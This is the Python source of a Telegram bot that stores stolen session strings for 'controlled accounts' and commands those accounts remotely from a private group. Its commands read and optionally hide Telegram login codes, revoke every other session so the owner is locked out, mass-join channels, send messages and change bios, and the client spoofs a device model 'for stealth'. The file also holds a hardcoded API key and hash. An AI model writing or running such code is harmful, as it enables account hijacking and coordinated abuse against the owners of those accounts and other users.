import os
import asyncio
import telebot
import psycopg2
from telethon import TelegramClient, functions, types, errors
from telethon.sessions import StringSession

# --- 1. CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")

try:
    raw_group_id = os.environ.get("GROUP_ID", "0")
    GROUP_ID = int(raw_group_id)
except ValueError:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)

# --- 2. DATABASE LOGIC (NEON.COM / POSTGRES) ---

def init_db():
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS controlled_accounts (
            phone TEXT PRIMARY KEY,
            session_string TEXT NOT NULL,
            owner_name TEXT
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()

def save_account(phone, session, name):
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('''
        INSERT INTO controlled_accounts (phone, session_string, owner_name) 
        VALUES (%s, %s, %s) 
        ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
    ''', (phone, session, name))
    conn.commit()
    cur.close()
    conn.close()

def delete_account(phone):
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("DELETE FROM controlled_accounts WHERE phone = %s", (phone,))
    conn.commit()
    rows_deleted = cur.rowcount
    cur.close()
    conn.close()
    return rows_deleted > 0

def get_session(phone):
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("SELECT session_string FROM controlled_accounts WHERE phone = %s", (phone,))
    res = cur.fetchone()
    cur.close()
    conn.close()
    return res[0] if res else None

def get_all_phones():
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("SELECT phone, owner_name FROM controlled_accounts")
    res = cur.fetchall()
    cur.close()
    conn.close()
    return res

# Initialize database on startup
init_db()

# --- 3. CORE TELETHON RUNNER ---

async def run_task(phone, task_func, *args):
    session_str = get_session(phone)
    if not session_str:
        return f"❌ Phone number <code>{phone}</code> not found in Database."
    
    # Using a generic iPhone model for stealth
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    try:
        # Timeout added to prevent long hangs
        await asyncio.wait_for(client.connect(), timeout=15)
        
        if not await client.is_user_authorized():
            return f"❌ Session for <code>{phone}</code> is invalid or revoked."
            
        return await task_func(client, *args)
    except asyncio.TimeoutError:
        return "⚠️ Connection Timeout: Telegram is not responding."
    except Exception as e:
        return f"⚠️ Technical Error: {str(e)}"
    finally:
        await client.disconnect()

# --- 4. COMMAND HANDLERS ---

@bot.message_handler(commands=['start', 'help'])
def cmd_help(m):
    if m.chat.id != GROUP_ID: return
    help_text = (
        "👑 <b>Vinzy Controller Elite</b>\n"
        "━━━━━━━━━━━━━━━\n"
        "🔌 <b>Auth & DB:</b>\n"
        "• <code>.auth [string]</code>\n"
        "• <code>.list</code>\n"
        "• <code>.deleteauth [phone]</code>\n\n"
        "🕵️ <b>Stealth:</b>\n"
        "• <code>.getcode [phone]</code>\n"
        "• <code>.kickall [phone]</code>\n\n"
        "🎮 <b>Remote:</b>\n"
        "• <code>.join [phone] [link]</code>\n"
        "• <code>.massjoin [link]</code>\n"
        "• <code>.msg [phone] [user] [text]</code>\n"
        "• <code>.bio [phone] [text]</code>\n"
        "━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, help_text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.auth'))
def cmd_auth(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(None, 1)
    if len(parts) < 2:
        return bot.reply_to(m, "❌ Usage: <code>.auth [string]</code>")
    
    session_str = parts[1].strip()
    # Clean up the string if it was sent with parentheses like (.auth ...)
    session_str = session_str.replace('(', '').replace(')', '')
    
    status_msg = bot.reply_to(m, "⏳ <i>Verifying and Saving Session...</i>", parse_mode="HTML")

    async def verify():
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                return "❌ <b>Failed:</b> Session string is invalid or expired."
            
            me = await client.get_me()
            save_account(me.phone, session_str, me.first_name)
            return f"✅ <b>Authorized:</b> {me.first_name}\n📱 Phone: <code>{me.phone}</code>"
        except Exception as e:
            return f"⚠️ <b>Error:</b> {str(e)}"
        finally:
            await client.disconnect()

    res = asyncio.run(verify())
    bot.edit_message_text(res, m.chat.id, status_msg.message_id, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.deleteauth'))
def cmd_delete_auth(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2:
        return bot.reply_to(m, "❌ Usage: <code>.deleteauth [phone]</code>")
    
    phone = parts[1].strip()
    if delete_account(phone):
        bot.reply_to(m, f"🗑️ <b>Removed:</b> <code>{phone}</code> has been deleted from the database.", parse_mode="HTML")
    else:
        bot.reply_to(m, f"❓ <b>Not Found:</b> <code>{phone}</code> was not in the database.", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.list')
def cmd_list(m):
    if m.chat.id != GROUP_ID: return
    accounts = get_all_phones()
    if not accounts: return bot.reply_to(m, "📭 <b>Database is empty.</b>")
    
    msg = "📋 <b>Managed Accounts:</b>\n"
    for phone, name in accounts:
        msg += f"• {name} (<code>{phone}</code>)\n"
    bot.send_message(m.chat.id, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.getcode'))
def cmd_getcode(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2: 
        return bot.reply_to(m, "❌ Usage: <code>.getcode [phone]</code>")
    
    phone = parts[1]
    async def logic(client):
        # 777000 is Telegram's official notification ID
        async for msg in client.iter_messages(777000, limit=1):
            code_text = msg.text
            # Optionally delete the code message for extra stealth
            # await client.delete_messages(777000, [msg.id])
            return f"📩 <b>Code for {phone}:</b>\n\n<code>{code_text}</code>"
        return "📭 No recent code found from Telegram."

    res = asyncio.run(run_task(phone, logic))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.kickall'))
def cmd_kickall(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2: 
        return bot.reply_to(m, "❌ Usage: <code>.kickall [phone]</code>")
    
    phone = parts[1]
    async def logic(client):
        # This revokes all other sessions except this one
        await client(functions.auth.ResetAuthorizationsRequest())
        return f"⚡ <b>Kicked all other sessions</b> for <code>{phone}</code>."

    res = asyncio.run(run_task(phone, logic))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.massjoin'))
def cmd_massjoin(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2: 
        return bot.reply_to(m, "❌ Usage: <code>.massjoin [link]</code>")
    
    link = parts[1]
    phones = get_all_phones()
    bot.send_message(m.chat.id, f"🚀 <b>Mass-Join:</b> Starting join for {len(phones)} accounts...")
    
    async def logic(client, target):
        try:
            # Detect if it's a private link or a public username
            if "t.me/+" in target or "joinchat" in target:
                clean_hash = target.split('/')[-1].replace('+', '')
                await client(functions.messages.ImportChatInviteRequest(hash=clean_hash))
            else:
                target = target.replace('@', '').split('/')[-1]
                await client(functions.channels.JoinChannelRequest(channel=target))
            return True
        except:
            return False

    success = 0
    for phone, name in phones:
        if asyncio.run(run_task(phone, logic, link)) is True:
            success += 1
    
    bot.send_message(m.chat.id, f"✅ <b>Done!</b> {success}/{len(phones)} accounts successfully joined {link}.", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.msg'))
def cmd_msg(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ", 3)
    if len(parts) < 4: 
        return bot.reply_to(m, "❌ Usage: <code>.msg [phone] [user] [text]</code>")
    
    phone, target, text = parts[1], parts[2], parts[3]
    async def logic(client, t, txt):
        await client.send_message(t, txt)
        return f"✅ <b>Message Sent</b> from <code>{phone}</code> to {t}."

    res = asyncio.run(run_task(phone, logic, target, text))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.bio'))
def cmd_bio(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ", 2)
    if len(parts) < 3: 
        return bot.reply_to(m, "❌ Usage: <code>.bio [phone] [text]</code>")
    
    phone, new_bio = parts[1], parts[2]
    async def logic(client, text):
        await client(functions.account.UpdateProfileRequest(about=text))
        return f"✅ <b>Bio Updated</b> for <code>{phone}</code>."

    res = asyncio.run(run_task(phone, logic, new_bio))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

# --- 5. EXECUTION ---

if __name__ == "__main__":
    print("--- Vinzy Controller Elite Online ---")
    print(f"Targeting Group ID: {GROUP_ID}")
    bot.infinity_polling()
